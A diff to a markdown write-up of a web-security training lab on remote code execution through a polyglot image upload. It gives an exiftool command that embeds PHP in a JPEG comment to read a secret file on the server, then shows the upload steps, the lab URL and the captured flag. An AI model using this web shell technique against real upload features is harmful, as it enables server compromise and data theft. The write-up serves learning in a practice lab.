@@ -369,6 +369,16 @@ raBbwWYE7pk77sdGXjeDvpzl0PTQUbBq
 
 
 
+
+
+
+
+
+
+
+
+
+
 <details>
   <summary>Lab: Remote code execution via polyglot web shell upload</summary>
 
@@ -383,16 +393,37 @@ raBbwWYE7pk77sdGXjeDvpzl0PTQUbBq
 
 3. try to upload normal photo and edit it's exifdata and save output as `exploit.php` 
 
+
+
 ```
 exiftool -Comment="<?php echo 'The_Flag{ ' . file_get_contents('/home/carlos/secret') . ' }'; ?>" test.jpg -o exploit.php
 ```
 
+## exif data before edit
 
+<img width="824" height="671" alt="image" src="https://github.com/user-attachments/assets/e7267702-d29d-41cc-aba6-b0ef677cfec6" />
 
+## after add comment 
 
+<img width="1043" height="673" alt="image" src="https://github.com/user-attachments/assets/7dc65f18-31a4-4338-a183-b830e7b1306e" />
 
+## now upload the file `exploit.php`
 
+<img width="1529" height="590" alt="image" src="https://github.com/user-attachments/assets/36114e3c-ebcf-4ac1-a781-826954231a8e" />
 
+## it uploaded successfully
+
+## now open it :
+
+```url
+https://0a7400ff046083dc842e2c5700ca0038.web-security-academy.net/files/avatars/exploit.php
+```
+
+<img width="738" height="127" alt="image" src="https://github.com/user-attachments/assets/ddaad659-e567-43bb-ab42-5701d3cf19dd" />
+
+```
+Flag{ F3gFwV8J7kDtBUn4tWxIIgvaE9gZJDVF }
+```
 
   
 </details>
